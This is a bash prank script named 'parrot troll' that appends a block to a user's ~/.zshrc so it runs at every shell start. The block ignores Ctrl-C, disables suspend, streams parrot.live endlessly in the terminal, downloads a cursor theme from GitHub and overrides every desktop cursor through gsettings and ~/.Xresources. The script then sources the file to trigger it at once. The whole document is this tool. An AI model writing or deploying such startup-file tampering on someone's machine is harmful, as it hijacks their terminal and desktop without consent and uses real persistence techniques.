#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
mkdir -p ~/.icons/parrot-cursor/
cd ~/.icons/parrot-cursor
wget -q https://raw.githubusercontent.com/PedroZappa/parrot.troll/main/parrot-cursor/index.theme -O index.theme
mkdir -p cursors && cd cursors
wget -q https://github.com/PedroZappa/parrot.troll/raw/main/parrot-cursor/cursors/pointer -O default
ln -s default arrow
ln -s default pointer
ln -s default text
ln -s default cross
ln -s default hand1
ln -s default hand2
ln -s default left_ptr
ln -s default watch
ln -s default move
ln -s default dnd-ask
ln -s default dnd-copy
ln -s default dnd-link
ln -s default dnd-none
gsettings set org.gnome.desktop.interface cursor-theme 'parrot-cursor'
gsettings set org.gnome.desktop.interface cursor-size 32
cd
EOF
)

X_PARROT_TROLL=$(cat << 'EOF'
Xcursor.theme: parrot-cursor
Xcursor.size: 32
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
		echo "$PARROT_TROLL" >> "$file"
		echo "Parrot Troll 🦜 added to $file"
    fi
	echo "$X_PARROT_TROLL" >> ~/.Xresources
	xrdb -merge ~/.Xresources
}

append_parrot_troll ~/.zshrc
source ~/.zshrc
